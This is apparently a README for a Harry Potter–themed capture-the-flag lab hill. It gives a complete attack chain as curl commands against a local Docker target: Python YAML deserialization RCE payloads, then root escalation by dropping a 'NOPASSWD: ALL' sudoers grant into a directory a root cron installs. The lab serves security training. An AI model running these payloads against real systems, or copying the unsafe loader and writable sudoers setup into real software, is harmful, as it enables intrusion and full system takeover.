# Hill 18 - Gringotts Vault (Harry Potter) (repair -> YAML deserialization -> writable sudoers.d)

*Theme: Harry Potter.* A "repair-first" hill: the vault ledger is corrupt and the door is
**sealed**. Rebuild the ledger, then the vault door parses submitted YAML with an unsafe
loader.

- **Repair gate:** `GET /repair?ledger=rebuilt&seal=lifted` opens the vault door.
- **Entry:** `POST /vault/open` with a YAML manifest -> `yaml.unsafe_load` -> deserialization
  RCE (e.g. `!!python/object/apply:subprocess.getoutput [["<cmd>"]]`). Foothold: `goblin`.
  Port 80 (8098 locally).
- **Privesc:** a root cron installs any `*.sudo` fragment dropped into the goblin-writable
  `/opt/vault/grants/` (as `root:root`, mode 0440). Drop a sudoers grant, wait, then `sudo`.
  Restored on reset.
- **Flags:** `user.txt` (foothold) and `/root/root.txt` (root).

## Attack chain

    # 1. rebuild the ledger (open the vault door)
    curl -s 'http://127.0.0.1:8098/repair?ledger=rebuilt&seal=lifted'

    # 2. YAML deserialization RCE -> user flag (getoutput takes one shell string)
    curl -s -X POST --data-binary \
      '!!python/object/apply:subprocess.getoutput ["cat /home/goblin/user.txt"]' \
      http://127.0.0.1:8098/vault/open

    # 3. privesc: drop a sudoers grant (base64 avoids quoting the parens); root installs it in ~3s
    G=$(printf 'goblin ALL=(root) NOPASSWD: ALL\n' | base64 -w0)
    curl -s -X POST --data-binary \
      "!!python/object/apply:subprocess.getoutput [\"echo $G | base64 -d > /opt/vault/grants/pwn.sudo\"]" \
      http://127.0.0.1:8098/vault/open
    sleep 4
    curl -s -X POST --data-binary \
      '!!python/object/apply:subprocess.getoutput ["sudo cat /root/root.txt"]' \
      http://127.0.0.1:8098/vault/open

    # 4. take the hill: write your token to /root/king.txt as root (sudo tee, no quoting needed)
    curl -s -X POST --data-binary \
      '!!python/object/apply:subprocess.getoutput ["echo TOK-YOUR-TEAM | sudo tee /root/king.txt"]' \
      http://127.0.0.1:8098/vault/open

## Run locally

    docker compose up -d --build   # app: http://localhost:8098/

## Reset behaviour

`reset.sh` clears dropped grants and any installed sudoers fragment, re-arms the writable
grants dir and root installer, and **re-seals the vault** (back to the repair puzzle). It
does **not** touch `king.txt`.
